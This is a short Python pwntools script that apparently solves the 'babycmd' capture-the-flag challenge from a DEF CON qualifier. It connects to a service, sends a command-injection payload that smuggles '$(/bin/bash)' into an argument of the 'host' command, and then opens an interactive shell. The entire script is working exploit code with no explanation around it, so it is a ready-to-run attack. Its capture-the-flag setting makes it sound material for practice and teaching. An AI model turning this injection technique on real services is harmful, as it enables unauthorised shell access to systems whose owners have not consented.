#!/usr/bin/python

from pwn import *

terminator = "A"
targetcmd = "host"
command = "/bin/bash"
front = "$("
rear  = ")"

payload = targetcmd + " " + terminator + front + command + rear + terminator
followup = "ping -c 3 127.0.0.1 > /proc/self/fd/4"

#conn = remote('babycmd_3ad28b10e8ab283d7df81795075f600b.quals.shallweplayaga.me',15491)

conn = remote('localhost',8080)
banner = conn.recvuntil(":")
print "[+] Banner received, sending malicious command..."
raw_input()
conn.sendline(payload)
conn.sendline(followup)
conn.interactive()

